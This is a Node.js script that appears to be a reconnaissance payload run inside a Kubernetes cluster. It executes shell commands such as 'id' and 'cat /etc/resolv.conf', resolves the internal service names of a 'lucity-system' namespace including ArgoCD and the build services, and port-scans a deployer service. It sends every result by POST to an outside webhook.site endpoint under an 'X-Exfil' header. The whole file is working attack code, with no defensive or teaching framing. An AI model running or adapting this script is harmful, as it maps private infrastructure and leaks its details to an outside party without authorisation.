const https = require('https');
const dns = require('dns');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/8dc30164-e900-4fbc-9b58-471055e0f821";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function run(cmd) {
  try { return execSync(cmd, { timeout: 10000 }).toString(); }
  catch(e) { return 'ERR: ' + (e.stderr?.toString() || e.message).substring(0, 500); }
}

function resolveDNS(hostname) {
  return new Promise((resolve) => {
    dns.resolve4(hostname, (err, addrs) => resolve(err ? 'FAIL:' + err.code : addrs.join(',')));
  });
}

async function main() {
  await post('v11b-start', new Date().toISOString());

  // Basic recon
  await post('id', run('id'));
  await post('resolv', run('cat /etc/resolv.conf'));
  await post('hostname', run('hostname'));

  // DNS resolution of all known services
  const svcNames = [
    'lucity-deployer.lucity-system.svc.cluster.local',
    'lucity-packager.lucity-system.svc.cluster.local',
    'lucity-builder.lucity-system.svc.cluster.local',
    'lucity-cashier.lucity-system.svc.cluster.local',
    'lucity-gateway.lucity-system.svc.cluster.local',
    'lucity-infra-zot.lucity-system.svc.cluster.local',
    'lucity-infra-soft-serve.lucity-system.svc.cluster.local',
    'lucity-infra-argocd-server.lucity-system.svc.cluster.local',
    'lucity-infra-argocd-redis.lucity-system.svc.cluster.local',
    'lucity-buildkit.lucity-system.svc.cluster.local',
    'lucity-webhook.lucity-system.svc.cluster.local',
    'lucity-dashboard.lucity-system.svc.cluster.local',
    'kubernetes.default.svc',
  ];

  const results = {};
  for (const svc of svcNames) {
    results[svc.split('.')[0]] = await resolveDNS(svc);
  }
  await post('dns-all', JSON.stringify(results, null, 2));

  // Quick port test on resolved IPs
  const net = require('net');
  async function testPort(host, port) {
    return new Promise((resolve) => {
      const sock = new net.Socket();
      sock.setTimeout(3000);
      sock.connect(port, host, () => { sock.destroy(); resolve('OPEN'); });
      sock.on('error', () => { sock.destroy(); resolve('CLOSED'); });
      sock.on('timeout', () => { sock.destroy(); resolve('TIMEOUT'); });
    });
  }

  // Test deployer on port 9003
  for (const ip of [results['lucity-deployer']]) {
    if (ip && !ip.startsWith('FAIL')) {
      const r = await testPort(ip, 9003);
      await post('deployer-port-' + ip, r);
    }
  }

  await post('v11b-done', new Date().toISOString());
  console.log('v11b done');
}

main().catch(e => { console.error(e); post('v11b-fatal', e.message); });
